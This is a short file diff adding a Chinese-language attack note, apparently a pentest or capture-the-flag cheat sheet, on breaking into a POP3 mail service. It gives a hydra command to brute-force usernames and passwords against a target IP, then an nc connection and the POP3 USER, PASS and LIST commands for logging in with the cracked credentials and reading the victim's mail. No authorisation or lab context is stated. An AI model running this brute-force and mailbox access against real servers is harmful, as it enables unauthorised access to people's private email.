@@ -1,0 +1,11 @@
+出现Pop的端口时
+
+可以使用暴力破解(user和Passwords可以通过其他渠道获得)
+hydra -L users -P passwords ip pop3
+破解成功后建立监听
+sudo nc ip port(pop3服务的端口)
+连接成功后
+使用 user 用户名(破解出来的)
+使用 Pass 密码(也是破解出来的)
+list 显示所有邮件
+输入邮件序号查看邮件内容
